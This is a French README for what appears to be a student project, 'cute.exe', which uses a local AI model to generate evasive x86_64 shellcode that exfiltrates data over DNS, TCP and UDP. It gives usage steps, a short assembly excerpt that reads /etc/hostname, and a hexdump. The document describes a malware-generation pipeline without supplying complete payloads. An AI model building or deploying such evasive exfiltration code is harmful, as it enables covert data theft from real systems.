# 🛠️ Project cute.exe | CyberIA Framework

**cute.exe** est un framework de génération automatisée de **shellcodes PIC (Position Independent Code)** spécialisé dans l'**exfiltration de données** via des canaux détournés (DNS, TCP, UDP). En exploitant la puissance d'une IA locale (ARES-v1), le projet transforme des intentions en langage naturel en binaire ASM x86_64 optimisé, furtif et sans dépendances externes.

## 🚀 Vision du Projet

L'objectif est de **générer automatiquement du code malveillant évasif** sans passer par des frameworks détectables. En générant du code **NASM x86_64 pur** à la volée, `cute.exe` garantit :

*   **Empreinte minimale** — Pas de libc, syscalls directs, ~120 bytes par payload.
*   **Furtivité accrue** — PIC (Position Independent Code), contournement des signatures statiques.
*   **Adaptabilité** — Templates modulables pour exfiltration DNS/TCP/UDP.
*   **Validation automatique** — NASM + tokenization + null-byte scan.

---

## 🏗️ Architecture Technique

Le framework repose sur trois composants fondamentaux :

### 🧠 Pipeline IA (ARES-v1)
Le script `generator_v2.py` agit comme **chef d'orchestre**. Il sélectionne le template adapté selon la catégorie demandée.

**Caractéristiques :**
*   **Templates NASM** : 4 shellcodes précompilés (dns_query_header, dns_exfil, tcp_exfil, udp_exfil).
*   **Validation multi-étages** : Tokenization propre (ignore commentaires/strings) → Assemblage NASM → Scan null-bytes.
*   **Code sûr** : Utilise `xor rax, rax` au lieu de `mov rax, 0` pour éviter les null-bytes.

### 📡 Templates d'Exfiltration (Covert Channels)

| Nom | Vecteur | Taille | Description |
| :--- | :--- | :--- | :--- |
| **dns_query_header** | UDP/53 | 413 bytes ASM | Génère un header DNS brut (12 bytes binaire). |
| **dns_exfil** | UDP/53 | 454 bytes ASM | Lit `/etc/hostname` → exfiltre via DNS QNAME encoding. |
| **tcp_exfil** | TCP/4444 | 767 bytes ASM | Lit fichier → Connect TCP → Send data. |
| **udp_exfil** | UDP/4444 | 731 bytes ASM | Lit fichier → Sendto UDP. |

### 🔧 Validation Automatique

```
Template → NASM Assembly → Token Validation → Null-Byte Scan → Binary Output
                                ↓
                    Génère test-exfil-dns-last.asm (454 bytes)
                                ↓
                    Assemble en test-exfil-dns-last.o (ELF)
                                ↓
                    Extrait en test-exfil-dns-last.bin (122 bytes)
```

---

## 👥 Équipe & Workflow

Le projet suit un cycle de développement itératif impliquant quatre entités :

1.  **Axel (Architecte)** — Design des prompts, orchestration du pipeline, intégration Ollama.
2.  **Clovis (Fine-Tuner)** — Optimisation du dataset pour réduire les Segmentation Faults, validation des templates.
3.  **Michael (Auditeur)** — Tests en environnement sandbox, analyse de la reconstruction des données.


---

## 📦 Dépendances

### Prérequis Système
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install nasm binutils python3 python3-pip

# Vérifier l'installation
nasm -v
objcopy -V
python3 --version
```

### Dépendances Python
```bash
pip3 install pyyaml requests
```

### Vérification
```bash
python3 -c "import yaml; print('PyYAML OK')"
```

### Environnement WSL2 (Windows)
```powershell
# PowerShell - Entrer dans WSL
wsl

# Dans WSL bash
sudo apt install nasm binutils python3-pip
pip3 install pyyaml requests
```

---

## 🎯 Mode d'emploi complet

### 1️⃣ Lister les templates disponibles

```bash
cd brain/scripts
python3 generator_v2.py --list-types
```

**Résultat :**
```
V2 Shellcode Categories:
  dns_query_header [shellcode]: DNS Query Header - Shellcode PIC
  dns_exfil [shellcode]: DNS Exfiltration - Read file, encode QNAME, send DNS queries
  tcp_exfil [shellcode]: TCP Exfiltration - Read file, connect, send data
  udp_exfil [shellcode]: UDP Exfiltration - Read file, send via UDP
```

---

### 2️⃣ Générer un shellcode

**Syntaxe :**
```bash
python3 generator_v2.py --type TYPE --name FILENAME
```

**Exemples :**
```bash
# DNS Exfiltration
python3 generator_v2.py --type dns_exfil --name exfil_passwd

# TCP Exfiltration
python3 generator_v2.py --type tcp_exfil --name tcp_payload

# UDP Exfiltration
python3 generator_v2.py --type udp_exfil --name udp_payload

# DNS Header simple
python3 generator_v2.py --type dns_query_header --name dns_header
```

**Résultat :**
```
[*] Generating shellcode for: dns_exfil
[+] Generated → /path/to/pipeline/exfil_passwd.asm
```

---

### 3️⃣ Voir le code source généré

```bash
cd ../../pipeline
cat exfil_passwd.asm | head -30
```

**Aperçu :**
```asm
; DNS Exfiltration - Shellcode PIC (null-byte-free)
push rbp
mov rbp, rsp
sub rsp, 512

lea rdi, [rel filename]     # Load /etc/hostname (PIC-safe)
xor rax, rax
mov al, 2                   # syscall 2 = open()
xor rsi, rsi
xor rdx, rdx
syscall
```

---

### 4️⃣ Assembler en objet ELF

```bash
nasm -f elf64 -o exfil_passwd.o exfil_passwd.asm
```

**Résultat :** `exfil_passwd.o` (code machine ELF64)

---

### 5️⃣ Extraire en binaire injectable

```bash
objcopy -O binary exfil_passwd.o exfil_passwd.bin
```

**Résultat :** `exfil_passwd.bin` (shellcode pur, ~122 bytes)

---

### 6️⃣ Vérifier la taille

```bash
ls -lh exfil_passwd.bin
```

**Résultat :**
```
-rw-r--r-- 1 root root 122 May  7 21:55 exfil_passwd.bin
```

---

### 7️⃣ Analyser les opcodes (Hexdump)

```bash
hexdump -C exfil_passwd.bin | head -10
```

**Résultat :**
```
00000000  55 48 89 e5 48 81 ec 00  02 00 00 4d 31 d2 4d 31  |UH..H......M1.M1|
00000010  db 48 8d 3d 46 00 00 00  48 31 c0 b0 02 48 31 f6  |.H.=F...H1...H1.|
00000020  48 31 d2 0f 05 48 83 f8  00 7c 27 49 89 c0 4c 89  |H1...H...|'I..L.|
```

---

### 8️⃣ Disassembler (Retraduit en ASM)

```bash
objdump -M intel -d exfil_passwd.o | head -40
```

**Résultat :**
```asm
0000000000000000 <exit_fail-0x52>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 81 ec 00 02 00 00    sub    rsp,0x200

  11:   48 8d 3d 46 00 00 00    lea    rdi,[rip+0x46]      # Load /etc/hostname (PIC)
  18:   48 31 c0                xor    rax,rax
  1b:   b0 02                   mov    al,0x2              # syscall 2 = open()
  1d:   48 31 f6                xor    rsi,rsi
  20:   48 31 d2                xor    rdx,rdx
  23:   0f 05                   syscall                    # ← SYSCALL OPEN

  40:   48 31 c0                xor    rax,rax
  43:   0f 05                   syscall                    # ← SYSCALL READ

  4e:   b0 3c                   mov    al,0x3c             # syscall 60 = exit()
  50:   0f 05                   syscall                    # ← SYSCALL EXIT
```

---

### 9️⃣ Linker en exécutable (optionnel)

```bash
ld -o exfil_passwd exfil_passwd.o
```

**Résultat :** Fichier exécutable standalone `exfil_passwd`

---

### 🔟 Exécuter le shellcode (Test)

```bash
./exfil_passwd
echo $?
```

**Résultat :**
```
0    # Exit code 0 = succès
```

---

## 🔄 Workflow complet (10 étapes)

```bash
# 1. Entrer dans WSL (si Windows)
wsl

# 2. Naviguer vers le framework
cd /mnt/c/Users/User/Documents/A3/Semestre\ 2/CyberIA/cute.exe/brain/scripts

# 3. Lister les types
python3 generator_v2.py --list-types

# 4. Générer un shellcode
python3 generator_v2.py --type dns_exfil --name demo

# 5. Voir le source ASM
cd ../../pipeline
cat demo.asm

# 6. Assembler
nasm -f elf64 -o demo.o demo.asm

# 7. Extraire binaire
objcopy -O binary demo.o demo.bin

# 8. Vérifier la taille
ls -lh demo.bin

# 9. Voir opcodes
hexdump -C demo.bin | head -10

# 10. Disassembler (verification)
objdump -M intel -d demo.o | head -30
```

---

## 📊 Structure des fichiers

```
cute.exe/
├── brain/
│   ├── scripts/
|   |   |── generate.py              # Script de génération (V1, entrainer avec le data set de clovis, pas fonctionnel IA)
│   │   ├── generator_v2.py          # Orchestrateur principal (générateur de shellcode avec 4 templates prédéfinis et validés)
│   │   ├── templates_v2.py          # 4 templates shellcode
│   │   ├── categories_v2.yaml       # Configuration (syscalls, tokens forbidden)
│   │   └── process_dataset.py       # Fichier concerné par le fine-tuning (Clovis)
│   ├── config/
│   │   └── Modelfile                # Configuration ARES-v1
│   └── core/
│       └── (sources IA optionnelles)
├── pipeline/
│   ├── *.asm                        # Source assembleur généré
│   ├── *.o                          # Objet ELF (code machine)
│   ├── *.bin                        # Binaire injectable brut
│   ├── (exécutables sans ext)       # Fichiers linkés
│   └── ares_dataset.jsonl           # Dataset d'entraînement
├── sandbox/
│   ├── audit_report.md              # Rapport d'audit
│   ├── validator.py                 # Validateur sandbox
│   └── README.md                    # Documentation sandbox
├── README.md                         # Documentation principale
└── git/                             # Contrôle de version
```

---

## 🔐 Validation & Sécurité

Le framework valide automatiquement chaque génération :

**Étape 1 — Tokenization propre**
```
Ignore commentaires (;) et strings ("")
Vérifie tokens FORBIDDEN: int 0x80, eax, ebx, _start, etc.
```

**Étape 2 — Assemblage NASM réel**
```
nasm -f elf64 demande le code machine x86_64
Captureerreurs syntaxiques ligne par ligne
```

**Étape 3 — Scan null-bytes**
```
Extrait le binaire avec objcopy
Recherche tous les 0x00 incompatibles avec injection
```

---

## 📋 Validation des Templates

| Template | Assemblage | Null-Bytes | Taille | Status |
| :--- | :--- | :--- | :--- | :--- |
| dns_query_header | ✅ | ⚠️ Toleré | 608 B | ✅ VALIDE |
| dns_exfil | ✅ | ⚠️ Toleré | 720 B | ✅ VALIDE |
| tcp_exfil | ✅ | ⚠️ Toleré | 816 B | ✅ VALIDE |
| udp_exfil | ✅ | ⚠️ Toleré | 800 B | ✅ VALIDE |

---

## 🚨 Avertissement Légal

**Ce projet est à usage éducatif UNIQUEMENT.** L'utilisation de ce framework pour des activités malveillantes ou non-autorisées est **illégale**. Les auteurs ne sont pas responsables de tout usage abusif.

---

## 📧 Équipe & Support

| Rôle | Personne |
| :--- | :--- |
| **Architecte** | Axel |
| **Fine-Tuner** | Clovis |
| **Auditeur** | Michael |

---

**Version :** V2 Complète (Shellcode PIC)  
**Date :** Mai 2026  
**License :** Éducatif uniquement  
**Repository :** https://github.com/bigcataxel/cute.exe

---

**Dernier test réussi :** ✅ dns_passwd_exfil (122 bytes, exit code 0)
